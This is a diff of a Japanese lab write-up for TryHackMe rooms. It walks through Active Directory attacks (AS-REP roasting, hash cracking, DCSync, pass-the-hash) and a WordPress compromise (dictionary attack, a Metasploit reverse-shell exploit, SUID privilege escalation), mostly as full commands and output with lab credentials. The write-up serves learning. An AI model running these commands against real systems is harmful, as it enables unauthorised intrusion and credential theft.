@@ -672,7 +672,7 @@ Kerberosの設定において、認証を簡略化した方法を利用してい
 事前準備でkerbruteの実行はできているので、攻撃対象の設定をする。
 
 kali上の`/etc/hosts`にIPとドメインの名前解決の設定をしておく
-```
+```sh
 sudo nano /etc/hosts
 ```
 最終行に以下を追加(間はtab)
@@ -680,7 +680,7 @@ sudo nano /etc/hosts
 10.10.x.x   spookysec.local
 ```
 試しにPingを打って返事が来ればOK
-```
+```sh
 ping spookysec.local
 -->64 bytes from spookysec.local (10.10.100.203): icmp_seq=1 ttl=124 time=720 ms
 -->64 bytes from spookysec.local (10.10.100.203): icmp_seq=1 ttl=124 time=720 ms
@@ -688,7 +688,7 @@ ping spookysec.local
 
 攻撃用のユーザーリストとパスワードリストについては今回TryHackMeのRoomのTask4に準備されているのでDLしておく。
 本来は、元々Kaliに準備されている辞書を利用するべきだが、今回は事前準備されているものを利用する。
-```
+```sh
 wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
 wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
 ```
@@ -698,7 +698,7 @@ Userを割り出すためにKerbruteを利用して実行
 - -d: 対象ドメイン指定
 - --dc: ドメインコントローラー指定
 - userlist.txt: 利用する辞書
-```
+```sh
 ./kerbrute/dist/kerbrute_linux_arm64 userenum -d spookysec.local --dc spookysec.local userlist.txt
 ```
 
@@ -715,11 +715,11 @@ Impacketは、さまざまなプロトコルをプログラムから操作しや
 GetNPUser.pyを利用して、取得したユーザーを利用してTGTを取得してみる
 
 以下を実行してパスワードは未記入でEnter
-```
+```sh
 ./GetNPUsers.py spookysec.local/svc-admin   
 ```
 得られたTGTが以下
-```
+```sh
 $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f~~~~~555
 ```
 得られたHash値はhash.txtに書き込んでおく
@@ -728,7 +728,7 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f~~~~~555
 取得できたTGTのハッシュからhashcatを利用してhash解析をしてパスワードを取得。
 
 hashcatでは、解析したいハッシュ対象を指定するため、確認するとAS-REQは18200
-```
+```sh
 ┌──(kali㉿kali)-[~/7DaysHacking/Day6]
 └─$ hashcat -h |grep Kerberos
   19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
@@ -736,7 +736,7 @@ hashcatでは、解析したいハッシュ対象を指定するため、確認�
   18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
 ```
 hashcatを実行してみると、management2005がパスワードとわかる！
-```
+```sh
 Dictionary cache built:
 * Filename..: passwordlist.txt
 * Passwords.: 70188
@@ -748,7 +748,7 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f~~~~~555:management2005
 
 IDとパスワードからSMBサービスにログインをしてみる。
 SMBのポートを利用してファイルサーバーにアクセスしてみる
-```
+```sh
 ┌──(kali㉿kali)-[~/7DaysHacking/Day6]
 └─$ smbclient -L \\\\spookysec.local -U svc-admin    
 Password for [WORKGROUP\svc-admin]:management2005
@@ -767,7 +767,7 @@ Unable to connect with SMB1 -- no workgroup available
 
 ```
 backupの中身からbackupユーザーのIDとPWを取得
-```
+```sh
 ┌──(kali㉿kali)-[~/7DaysHacking/Day6]
 └─$ smbclient  \\\\spookysec.local\\backup -U svc-admin
 Password for [WORKGROUP\svc-admin]:management2005
@@ -791,7 +791,7 @@ YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
 ```
 
 最後に、得られた値がBase64dエンコードされている可能性があるので解読すると`backup2517860`がパスワードとわかる
-```
+```sh
 ┌──(kali㉿kali)-[~/7DaysHacking/Day6]
 └─$ cat backup_credentials.txt|base64 -d                        
 backup@spookysec.local:backup2517860
@@ -804,7 +804,7 @@ ActiveDirectoryでは、パスワード情報などを暗号化したNTLMハッ�
 
 #### Impacketを利用したDCsync
 Impacketのツールを利用して、DCsyncを実行
-```
+```sh
 ┌──(kali㉿kali)-[~/7DaysHacking/Day6]
 └─$ ./secretsdump.py -just-dc-ntlm backup@spookysec.local -outputfile spookysec
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -825,7 +825,7 @@ NTLMでは、ユーザー名とハッシュ化されたパスワードが保管�
 `Pass the Hash`ではユーザー情報とハッシュをそのまま利用して認証を済ましてしまうNTLM認証の脆弱性を突いて、ユーザーになりすます。
 
 Evil-WinRMというツールを利用することでPass the Hash攻撃を行ってroot.txtを取得
-```
+```sh
 ┌──(kali㉿kali)-[~/7DaysHacking/Day6]
 └─$ evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
 
@@ -849,33 +849,215 @@ TryHackMe{4ctiveD1rectoryM4st3r}
 WordPressに対して、自書攻撃をしてアプリにログインをしたり、脆弱性からサーバーのOSユーザーをハックしてから権限昇格をする。
 
 ### 偵察
-sbmclientとWordPressのポートが開いている。
-どうやらWordPressのバージョンは少し古い
+nmapで偵察をしてみる
+- 22:SSH
+- 80:WordPressでWordPressのバージョンは少し古い
+- 139/445:Sambda
+```sh
+PORT      STATE    SERVICE         VERSION
+22/tcp    open     ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+| ~~
+80/tcp    open     http            Apache httpd 2.4.29 ((Ubuntu))
+| ~~
+|_/wp-admin/
+|_http-generator: WordPress 5.0
+| ~~
+139/tcp   open     netbios-ssn     Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open     netbios-ssn     Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+```
+
 
 ### smbclientへの攻撃
-こちらは、ステ画のグラフィなどを利用してみるが、Rabbit_Hole（迷宮に迷い込んでいる）
+smbclinetを利用して共有フォルダを探索してみると、anonymousユーザーでログインできるBillySMBファイルを発見。その中のファイルを3つDLできる
+```sh
+┌──(kali㉿kali)-[~/7DaysHacking/Day7]
+└─$ smbclient -L \\\\blog.thm                    
+Password for [WORKGROUP\kali]:
 
-### WordPressのアプリ変更劇
-#### ユーザー調査
-WordPressのスキャンでユーザー名を取得
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        BillySMB        Disk      Billy's local SMB Share
+        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+                                                                            
+┌──(kali㉿kali)-[~/7DaysHacking/Day7]
+└─$ smbclient  \\\\blog.thm\\BillySMB
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed May 27 03:17:05 2020
+  ..                                  D        0  Wed May 27 02:58:23 2020
+  Alice-White-Rabbit.jpg              N    33378  Wed May 27 03:17:01 2020
+  tswift.mp4                          N  1236733  Wed May 27 03:13:45 2020
+  check-this.png                      N     3082  Wed May 27 03:13:43 2020
+ 
+                15413192 blocks of size 1024. 9788760 blocks available
+smb: \> get Alice-White-Rabbit.jpg
+getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (7.1 KiloBytes/sec) (average 7.1 KiloBytes/sec)
+```
 
-#### パスワードの自書攻撃
-自書攻撃をしてみてパスワードを取得してログインしてみることで、wordpressのauthorのユーザーを取得できた。
-一方でアプリの侵入はできたがサーバーのOSには侵入できていない。
+#### ステガノグラフィ
+テキスト・音声・画像ファイルなどに隠しテキストを埋め込むことができる技術。
+`steghide`というツールを利用すると隠しテキストの埋め込みや抽出が可能。
+
+今回はjpegに対して、抽出を実行してみるとrabbit_hole.txtが取得できる。
+しかし中身はRabbit_Hole（迷宮に迷い込んでいる）とのことでSambda側はハズレ。
+
+```sh
+┌──(kali㉿kali)-[~/7DaysHacking/Day7]
+└─$ sudo apt install steghide     
+~~~
+
+┌──(kali㉿kali)-[~/7DaysHacking/Day7]
+└─$ steghide extract -sf Alice-White-Rabbit.jpg 
+Enter passphrase: 
+wrote extracted data to "rabbit_hole.txt".
+```
+
+
+### WordPressのアプリへの攻撃
+npmapの結果から、Wordpressを利用しており、/wp-admin/に管理者画面がある。
+
+WordPressは利用者が多いアプリケーションのため、専用のスキャナがありユーザーを探索することができる。
+wpscanというコマンドを実行してユーザーを炙り出すと以下のユーザーがいることがわかる
+- kwheel
+- bjoel
+```sh
+┌──(kali㉿kali)-[~/7DaysHacking/Day7]
+└─$ wpscan --url http://blog.thm --enumerate u
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.24
+                               
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+
+[i] User(s) Identified:
+
+[+] kwheel
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+
+[+] bjoel
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+```
+
+ユーザーがわかったので、パスワードについては辞書攻撃で突破してみる。
+- `kwheel`のパスワードが`cutiepie1`
+```sh
+──(kali㉿kali)-[~/7DaysHacking/Day7]
+└─$ wpscan --url http://blog.thm -U kwheel,bjoel -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 4
+
+[!] Valid Combinations Found:
+ | Username: kwheel, Password: cutiepie1
+```
+
+WordPressに対してログインすることができ、Author権限を得ることができた。
+一方でアプリの侵入はできたがサーバーのOSには侵入できていないので別の攻撃を試してみる。
 
 ### WordPressのサーバーへの攻撃
 #### 脆弱性の調査
-WordPressのバージョンが古いので脆弱性を調査
+nmapの結果からWordPressのバージョンが古いことはわかっているので脆弱性をネットで調査すると2つ脆弱性があるらしい
+- CVE-2019-8942
+- CVE-2019-8943
+![](../img/Book/7DayHacking/7DayHacking_day7_1.png)
+
 #### Metasploitを利用した攻撃
-Metasploitを利用して脆弱性を突いてみると結果として、www-dataの権限を取得できた。
+Metasploitを利用して、CVE-2019-8942の脆弱性を突いてみる
+```sh
+┌──(kali㉿kali)-[~/7DaysHacking/Day7]
+└─$ msfconsole
+                                                  
+msf6 > search CVE-2019-8942
+
+Matching Modules
+================
+
+   #  Name                            Disclosure Date  Rank       Check  Description
+   -  ----                            ---------------  ----       -----  -----------
+   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
+
+msf6 > use 0
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/wp_crop_rce) > 
+```
+
+各種設定を指定して、実行してみる
+```sh
+msf6 exploit(multi/http/wp_crop_rce) > set password cutiepie1
+password => cutiepie1
+msf6 exploit(multi/http/wp_crop_rce) > set rhosts blog.thm
+rhosts => blog.thm
+msf6 exploit(multi/http/wp_crop_rce) > set username kwheel
+username => kwheel
+msf6 exploit(multi/http/wp_crop_rce) > set lhost 10.17.30.207
+lhost => 10.17.30.207
+msf6 exploit(multi/http/wp_crop_rce) > show options
+
+Module options (exploit/multi/http/wp_crop_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   cutiepie1        yes       The WordPress password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     blog.thm         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the wordpress application
+   THEME_DIR                   no        The WordPress theme dir name (disable theme auto-detection if provided)
+   USERNAME   kwheel           yes       The WordPress username to authenticate with
+   VHOST                       no        HTTP server virtual host
+```
+
+結果として、www-dataの権限を取得できた。
+```sh
+msf6 exploit(multi/http/wp_crop_rce) > exploit
+
+[*] Started reverse TCP handler on 10.17.30.207:4444 
+[*] Authenticating with WordPress using kwheel:cutiepie1...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload
+[+] Image uploaded
+[*] Including into theme
+[*] Sending stage (39927 bytes) to 10.10.172.46
+[*] Attempting to clean up files...
+[*] Meterpreter session 1 opened (10.17.30.207:4444 -> 10.10.172.46:45924) at 2025-04-26 10:53:17 +0900
+
+meterpreter > getuid
+Server username: www-data
+```
 
 ### 権限昇格
 adminなどの強い権限を取得するために脆弱性を調査する。
 #### LinPEAS
+ターゲットサーバーへの初期侵入が完了後、実行することで権限昇格できそうなミスを探すためのツール。
+
 #### LinPEASをターゲットへアップロード
-ローカル側にサーバーを立てて、侵入済みのサーバーからDLする流れ
+取得方法はローカルマシーンでLinPEASをDLしておいて、ローカルでサーバーを立てる。その後進入済みのマシーンからローカルマシーンに対してDLするような処理で行う。
+
 #### LinPEASの実行
 実行すると実行権限に`s`がついているコマンドを発見。
-#### 権限昇格
+```
+                      ╔════════════════════════════════════╗
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                              
+                      ╚════════════════════════════════════╝                       
+~~~
+-rwsr-sr-x 1 root root 8.3K May 26  2020 /usr/sbin/checker (Unknown SUID binary!)
+~~~
+```
+中身としては、現実味がないので割愛するが、このコマンドの脆弱性を突いてrootに昇格。
 
 ### Day7勉強したこと
+- wordpressは有名すぎてスキャンや辞書攻撃のツールが簡単に利用できる
+- WordPressなどのアプリもバージョンが古いままだと脆弱性があるので、msfconsoleなどですぐに攻撃できてしまう
+- 小さな権限ユーザーでも侵入されると、`LinPEAS`などで権限昇格できないかすぐに調査されてしまう
